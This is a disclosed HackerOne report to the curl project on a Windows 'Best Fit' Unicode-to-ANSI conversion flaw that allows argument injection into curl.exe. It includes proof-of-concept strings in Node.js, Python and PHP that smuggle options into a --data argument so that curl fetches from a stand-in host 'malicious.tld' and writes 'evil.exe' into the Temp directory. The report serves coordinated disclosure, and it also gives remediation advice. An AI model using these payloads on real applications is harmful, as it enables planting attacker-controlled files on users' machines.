# Unicode-to-ASCII conversion on Windows can lead to argument injection and more

## Report Details
- **Report ID**: 2550951
- **URL**: https://hackerone.com/reports/2550951
- **State**: Closed
- **Severity**: high
- **Submitted**: 2024-06-13T10:01:20.635Z
- **Disclosed**: 2024-06-18T10:52:28.254Z

## Reporter
- **Username**: splitline
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: curl

## Vulnerability Information
Hello cURL team,

I am splitline from DEVCORE Research Team. We recently found a vulnerability on cURL. We have reproduced the issues in the latest version of cURL (curl-8.8.0_1) and would like to report it to you. Please check the attached document for details.

This advisory is in accordance with our vulnerability disclosure policy, which will be publicly disclosed after 90 days. Our aim is to ensure that vulnerabilities can be patched in a timely manner. Although it’s not a hard deadline, we still hope you can fix this vulnerability before September 11, 2024.

Please let me know if you have any questions, thanks!


### Summary

We noticed that the misuse of the Windows ANSI API in cURL could result in unexpected argument parsing behaviour for cURL. This could consequently lead to argument injection when invoking the `curl.exe` from the command line.

### Affected Environment

- Operation System: Microsoft Windows
    - Tested on Windows 10/11, should also work on most of the versions.
- Language (system locale):
    - CP874:    Thai
    - CP1250:   Central European language (e.g. English, German, Polish)
    - CP1251:   Cyrillic
    - CP1252:   Western European language (e.g. English, Spanish, French)
    - CP1253:   Greek
    - CP1254:   Turkish
    - CP1255:   Hebrew
    - CP1256:   Arabic
    - CP1257:   Baltic
    - CP1258:   Vietnamese
    - (Does NOT affect Chinese, Japanese and Korean)

### Description

Firstly, on Windows, command line arguments are passed as a string and are parsed by the executable itself. In contrast, on Linux, arguments are always passed to the executable as an array of strings.

Secondly, Windows exists a behavior known as "Best Fit" encoding conversion[`[1]`](https://www.unicode.org/Public/MAPPINGS/VENDORS/MICSFT/WindowsBestFit/readme.txt)[`[2]`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ucoderef/d1980631-6401-428e-a49d-d71394be7da8). This occurs when Windows needs to convert characters between Unicode UTF-16 (WideChar) and ANSI (MultiByte). For instance, if a Unicode character `＂` (U+FF02, fullwidth double quote) is passed as an argument but received with the [`GetCommandLineA`](https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinea) ANSI API, in certain system locales, it will trigger the "best fit" behavior and convert this Unicode UTF-16 character into `"` (0x22, double quote).

Here in our case, `curl.exe` receives the command line string using ANSI API. So if you pass some Unicode characters into those executables, it will be converted to another character, which leads to an unexpected argument parsing result in the end.


### Examples / Step to reproduce

Before we start, we need to make sure the Windows system locale is configured to any of the following language types: Central European, Western European, Greek, Hebrew, Baltic, Cyrillic, Arabic, Turkish, Vietnamese or Thai. You can check your codepage by the following command:
```powershell
powershell.exe [Console]::OutputEncoding.WindowsCodePage
```

If your computer is currently not configured to that language, here are the detailed steps to do the configuration (for Windows 11):
    1. Go to "Settings" > "Time & Language" > "Language & Region"
    2. Click the "Administrative language settings" item (in the "Related settings" section)
    3. In the "Language for non-Unicode programs" section, click the "Change system locales" button. Set the system locale to any of the languages we mentioned. Here we can take "English (United States)" as an example. (Remember to restart your machine)
    4. Check the codepage again with the command we mentioned: `powershell.exe [Console]::OutputEncoding.WindowsCodePage`. It should be `1252` if you chose "English (United States)".


Here we opt for Node.js, Python and PHP as some examples.

In the subsequent three scenarios, where argument escaping or argument separating could fail, leading to argument injection. Furthermore, there's also the potential for executing arbitrary commands. As an illustration, we simply demonstrate by writing file into temp directory.

Ensure to substitute `malicious.tld` and `<username>` in the following scripts with a appropriate values on your system. In this context, `malicious.tld` denotes a domain or website controlled by a malicious actor, while `<username>` represents the username of the current user.

In Node.js:
```javascript
const child_process = requite('child_process');
const arg = "name=meow\u{FF02} malicious.tld \u{FF02}-o-\u{FF02} \u{FF02}-o ..\..\..\..\..\..\..\..\..\\Users\\<username>\\AppData\\Local\\Temp\\evil.exe";
child_process.spawnSync("curl.exe", ["https://example.com/", "--data", arg]);
```

In Python:
```python
import subprocess
arg = "name=meow\uFF02 malicious.tld \uFF02-o-\uFF02 \uFF02-o ..\..\..\..\..\..\..\..\..\\Users\\<username>\\AppData\\Local\\Temp\\evil.exe"
subprocess.run(['curl.exe', "https://example.com/", "--data", arg])
```

In PHP:
```php
define("arg", "name=meow\u{FF02} malicious.tld \u{FF02}-o-\u{FF02} \u{FF02}-o ..\..\..\..\..\..\..\..\..\\Users\\<username>\\AppData\\Local\\Temp\\evil.exe");
proc_open(['curl.exe', "https://example.com/", "--data", arg], [], $pipes);
// or
system(sprintf("curl.exe https://example.com/ --data %s", escapeshellarg(arg)));
```


For the 3 preceding instances, they all result in the following parsing result in command line and `curl.exe`:

In command line:
```
                                     ┌─────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
curl.exe https://example.com/ --data "name=meow＂ malicious.tld ＂-o-＂ ＂-o ..\..\..\..\..\..\..\..\..\Users\<username>\AppData\Local\Temp\evil.exe"
                                     ↑         ↑                ↑    ↑  ↑                                                                          ↑
                                    0x22     U+FF02              U+FF02                                                                          0x22
```

In `curl.exe`
```
                                     ┌─────────┐ ┌────────────┐ ┌────┐ ┌───────────────────────────────────────────────────────────────────────────┐
curl.exe https://example.com/ --data "name=meow＂ malicious.tld ＂-o-＂ ＂-o ..\..\..\..\..\..\..\..\..\Users\<username>\AppData\Local\Temp\evil.exe"
                                     ↑         ↑                ↑    ↑  ↑                                                                          ↑
                                    0x22      0x22             0x22  0x22                                                                          0x22
```

Notice that U+FF02 isn't the only character that can be converted to a double quote; it's simply one example among many. For the full conversion tables, we can refer to [the document from Unicode.Org](https://www.unicode.org/Public/MAPPINGS/VENDORS/MICSFT/WindowsBestFit/readme.txt). Consequently, given this characteristic, it becomes exceedingly challenging for other programming languages to adequately handle argument escaping.


### Suggested Remediation

1. Avoid the using of the [ANSI Windows API](https://learn.microsoft.com/en-us/windows/win32/intl/unicode-in-the-windows-api) to get and parse the command line. 
2. If you didn't explicitly use the ANSI Windows API, it might be used by the compiler or standard library itself, there are several ways to hint the compiler to use UTF-16 (WideChar) API.
    1. Use `wmain` function as the main function: https://learn.microsoft.com/en-us/cpp/c-language/using-wmain?view=msvc-170
    2. Use the -municode flag while compiling: https://sourceforge.net/p/mingw-w64/wiki2/Unicode%20apps/
    

### Credit Discovery To
Orange Tsai (@orange_8361) and splitline (@splitline) from DEVCORE Research Team

## Impact

If an application invokes the `curl.exe` from the command line, and any part of an argument can be controlled by a user then it can lead to argument injection.

## Attachments
No attachments
